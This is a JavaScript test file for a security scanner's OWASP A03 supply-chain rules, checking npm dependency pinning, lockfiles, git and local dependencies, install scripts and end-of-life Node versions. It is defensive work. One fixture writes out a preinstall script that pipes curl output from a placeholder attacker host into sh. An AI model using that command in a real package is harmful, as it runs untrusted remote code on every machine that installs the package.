// engine/rules/a03/a03-rules.test.js
// A03 – Vulnerable & Outdated Components / Software Supply Chain Failures

import { describe, expect, it } from 'vitest';
import { runNodeEngineVersionRisk } from './node-engine-version-risk.js';
import { runNpmDependencyRisk } from './npm-dependency-risk.js';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
function npmCtx(partial = {}, extra = {}) {
  const pkg = { name: 'test-app', version: '1.0.0', dependencies: {}, devDependencies: {}, scripts: {}, ...partial };
  return { packageJson: JSON.stringify(pkg), packageJsonPath: '/project/package.json', hasLockfile: true, ...extra };
}

function nodeCtx(enginesNode, extra = {}) {
  const pkg = { name: 'test-app', version: '1.0.0' };
  if (enginesNode !== undefined) pkg.engines = { node: enginesNode };
  return { packageJson: JSON.stringify(pkg), packageJsonPath: '/project/package.json', ...extra };
}

// ---------------------------------------------------------------------------
// 1. A03-NPM-001 – Quá nhiều dependencies
// ---------------------------------------------------------------------------
describe('A03-NPM-001 – quá nhiều dependencies', () => {
  it('triggers khi có > 80 dependencies', () => {
    const deps = {};
    for (let i = 0; i < 81; i++) deps[`pkg-${i}`] = `^1.${i}.0`;
    const ids = runNpmDependencyRisk(npmCtx({ dependencies: deps })).map(f => f.ruleId);
    expect(ids).toContain('A03-NPM-001');
  });

  it('không trigger khi <= 80 dependencies', () => {
    const deps = {};
    for (let i = 0; i < 40; i++) deps[`pkg-${i}`] = `^1.${i}.0`;
    const ids = runNpmDependencyRisk(npmCtx({ dependencies: deps })).map(f => f.ruleId);
    expect(ids).not.toContain('A03-NPM-001');
  });
});

// ---------------------------------------------------------------------------
// 2. A03-NPM-002 – Version quá lỏng
// ---------------------------------------------------------------------------
describe('A03-NPM-002 – version không được pin', () => {
  it('triggers với "latest"', () => {
    const ids = runNpmDependencyRisk(npmCtx({ dependencies: { lodash: 'latest' } })).map(f => f.ruleId);
    expect(ids).toContain('A03-NPM-002');
  });

  it('triggers với "*"', () => {
    const ids = runNpmDependencyRisk(npmCtx({ dependencies: { express: '*' } })).map(f => f.ruleId);
    expect(ids).toContain('A03-NPM-002');
  });

  it('không trigger với version pin "^4.18.2"', () => {
    const ids = runNpmDependencyRisk(npmCtx({ dependencies: { express: '^4.18.2' } })).map(f => f.ruleId);
    expect(ids).not.toContain('A03-NPM-002');
  });
});

// ---------------------------------------------------------------------------
// 3. A03-NPM-003 – Local path dependency
// ---------------------------------------------------------------------------
describe('A03-NPM-003 – local path dependency', () => {
  it('triggers với "file:../my-lib"', () => {
    const ids = runNpmDependencyRisk(npmCtx({ dependencies: { 'my-lib': 'file:../my-lib' } })).map(f => f.ruleId);
    expect(ids).toContain('A03-NPM-003');
  });

  it('triggers với "link:../../shared"', () => {
    const ids = runNpmDependencyRisk(npmCtx({ dependencies: { shared: 'link:../../shared' } })).map(f => f.ruleId);
    expect(ids).toContain('A03-NPM-003');
  });

  it('finding có owaspCategory "A03"', () => {
    const f = runNpmDependencyRisk(npmCtx({ dependencies: { lib: 'file:../lib' } })).find(x => x.ruleId === 'A03-NPM-003');
    expect(f).toBeDefined();
    expect(f.owaspCategory).toBe('A03');
  });
});

// ---------------------------------------------------------------------------
// 4. A03-NPM-004 – Git URL dependency
// ---------------------------------------------------------------------------
describe('A03-NPM-004 – git URL dependency', () => {
  it('triggers với "github:user/repo"', () => {
    const ids = runNpmDependencyRisk(npmCtx({ dependencies: { pkg: 'github:user/repo' } })).map(f => f.ruleId);
    expect(ids).toContain('A03-NPM-004');
  });

  it('triggers với "git+https://github.com/user/repo.git"', () => {
    const ids = runNpmDependencyRisk(npmCtx({ dependencies: { pkg: 'git+https://github.com/user/repo.git' } })).map(f => f.ruleId);
    expect(ids).toContain('A03-NPM-004');
  });

  it('không trigger với npm registry version', () => {
    const ids = runNpmDependencyRisk(npmCtx({ dependencies: { axios: '^1.6.0' } })).map(f => f.ruleId);
    expect(ids).not.toContain('A03-NPM-004');
  });
});

// ---------------------------------------------------------------------------
// 5. A03-NPM-005 – Thiếu lockfile
// ---------------------------------------------------------------------------
describe('A03-NPM-005 – thiếu lockfile', () => {
  it('triggers khi hasLockfile === false', () => {
    const ids = runNpmDependencyRisk(npmCtx({}, { hasLockfile: false })).map(f => f.ruleId);
    expect(ids).toContain('A03-NPM-005');
  });

  it('không trigger khi có lockfile', () => {
    const ids = runNpmDependencyRisk(npmCtx({}, { hasLockfile: true })).map(f => f.ruleId);
    expect(ids).not.toContain('A03-NPM-005');
  });

  it('finding severity là "high"', () => {
    const f = runNpmDependencyRisk(npmCtx({}, { hasLockfile: false })).find(x => x.ruleId === 'A03-NPM-005');
    expect(f.severity).toBe('high');
  });
});

// ---------------------------------------------------------------------------
// 6. A03-NPM-006 – Lifecycle scripts nguy hiểm
// ---------------------------------------------------------------------------
describe('A03-NPM-006 – lifecycle scripts nguy hiểm', () => {
  it('triggers với "postinstall" script', () => {
    const ids = runNpmDependencyRisk(npmCtx({ scripts: { postinstall: 'node setup.js' } })).map(f => f.ruleId);
    expect(ids).toContain('A03-NPM-006');
  });

  it('triggers với "preinstall" script', () => {
    const ids = runNpmDependencyRisk(npmCtx({ scripts: { preinstall: 'curl http://evil.example.com | sh' } })).map(f => f.ruleId);
    expect(ids).toContain('A03-NPM-006');
  });

  it('không trigger khi không có lifecycle script', () => {
    const ids = runNpmDependencyRisk(npmCtx({ scripts: { start: 'node index.js' } })).map(f => f.ruleId);
    expect(ids).not.toContain('A03-NPM-006');
  });
});

// ---------------------------------------------------------------------------
// 7. A03-NODE-002 – Thiếu engines.node
// ---------------------------------------------------------------------------
describe('A03-NODE-002 – thiếu engines.node constraint', () => {
  it('triggers khi không có engines field', () => {
    const ids = runNodeEngineVersionRisk(nodeCtx(undefined)).map(f => f.ruleId);
    expect(ids).toContain('A03-NODE-002');
  });

  it('finding severity là "low"', () => {
    const f = runNodeEngineVersionRisk(nodeCtx(undefined)).find(x => x.ruleId === 'A03-NODE-002');
    expect(f.severity).toBe('low');
  });

  it('không trigger khi engines.node khai báo ">=20.0.0"', () => {
    const ids = runNodeEngineVersionRisk(nodeCtx('>=20.0.0')).map(f => f.ruleId);
    expect(ids).not.toContain('A03-NODE-002');
  });
});

// ---------------------------------------------------------------------------
// 8. A03-NODE-001 – engines.node cho phép EOL major version
// ---------------------------------------------------------------------------
describe('A03-NODE-001 – engines.node yêu cầu EOL version', () => {
  it('triggers với ">=12.0.0" (Node 12 EOL 2022)', () => {
    const ids = runNodeEngineVersionRisk(nodeCtx('>=12.0.0')).map(f => f.ruleId);
    expect(ids).toContain('A03-NODE-001');
  });

  it('triggers với ">=14 <22" (min major 14 là EOL)', () => {
    const ids = runNodeEngineVersionRisk(nodeCtx('>=14 <22')).map(f => f.ruleId);
    expect(ids).toContain('A03-NODE-001');
  });

  it('severity "high" khi major < 12', () => {
    const f = runNodeEngineVersionRisk(nodeCtx('>=10.0.0')).find(x => x.ruleId === 'A03-NODE-001');
    expect(f).toBeDefined();
    expect(f.severity).toBe('high');
  });

  it('không trigger với ">=20.0.0" (Node 20 LTS)', () => {
    const ids = runNodeEngineVersionRisk(nodeCtx('>=20.0.0')).map(f => f.ruleId);
    expect(ids).not.toContain('A03-NODE-001');
  });

  it('không trigger với range "18 || 20 || 22"', () => {
    const ids = runNodeEngineVersionRisk(nodeCtx('18 || 20 || 22')).map(f => f.ruleId);
    expect(ids).not.toContain('A03-NODE-001');
  });

  it('triggers với "14 || 16 || 18" vì minimum 14 là EOL', () => {
    const ids = runNodeEngineVersionRisk(nodeCtx('14 || 16 || 18')).map(f => f.ruleId);
    expect(ids).toContain('A03-NODE-001');
  });
});

// ---------------------------------------------------------------------------
// 9. Edge cases
// ---------------------------------------------------------------------------
describe('A03 – edge cases & input safety', () => {
  it('runNpmDependencyRisk trả về [] khi packageJson rỗng', () => {
    expect(runNpmDependencyRisk({ packageJson: '' })).toEqual([]);
  });

  it('runNpmDependencyRisk trả về [] khi packageJson là JSON không hợp lệ', () => {
    expect(runNpmDependencyRisk({ packageJson: 'not-json' })).toEqual([]);
  });

  it('runNodeEngineVersionRisk trả về [] khi packageJson rỗng', () => {
    expect(runNodeEngineVersionRisk({ packageJson: '' })).toEqual([]);
  });

  it('mọi finding của npm risk đều có owaspCategory "A03"', () => {
    const ctx = npmCtx(
      { dependencies: { bad: 'latest', local: 'file:../x', git: 'github:a/b' }, scripts: { postinstall: 'node x.js' } },
      { hasLockfile: false }
    );
    const findings = runNpmDependencyRisk(ctx);
    for (const f of findings) expect(f.owaspCategory).toBe('A03');
  });
});
